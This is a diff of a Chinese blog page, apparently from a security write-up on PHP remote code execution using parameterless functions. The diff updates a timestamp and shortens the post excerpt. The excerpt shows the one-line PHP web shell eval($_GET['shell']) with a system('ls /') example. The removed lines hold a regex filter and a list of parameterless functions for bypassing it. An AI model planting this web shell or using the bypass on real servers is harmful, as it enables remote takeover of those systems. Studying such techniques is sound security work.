@@ -457,7 +457,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-11T19:04:09+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-11T19:45:17+08:00">
                 2020-05-11
               </time>
             
@@ -514,17 +514,17 @@
 
       
         
-          
-            <p>由于eval()函数允许执行任意php代码，这就会造成远程代码执行</p>
+          <p>由于eval()函数允许执行任意php代码，这就会造成远程代码执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure>
 <p>即一句话木马，就可以getshell了</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'shell'</span>]=system(<span class="string">'ls /'</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);等同于<span class="built_in">eval</span>(system(<span class="string">'ls /'</span>));</span><br></pre></td></tr></table></figure>
-<p>但是如果正则过滤了带参函数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure>
-<p>那么就需要利用一些不带参数的函数</p>
-<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>localeconv() ：返回包含本地数字及货币格式信息的数组<br>current()、pos() ： 返回数组中的当前单元, 默认取第一个值<br>scandir() ：列出目录中的文件和目录<br>highlight_file() ：打印输出或者返回文件中语法高亮的代码<br>array_reverse() ：以相反的元素顺序返回数组<br>next() ：函数将内部指针指向数组中的下一个元素，并输出</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/05/10/%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0RCE/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
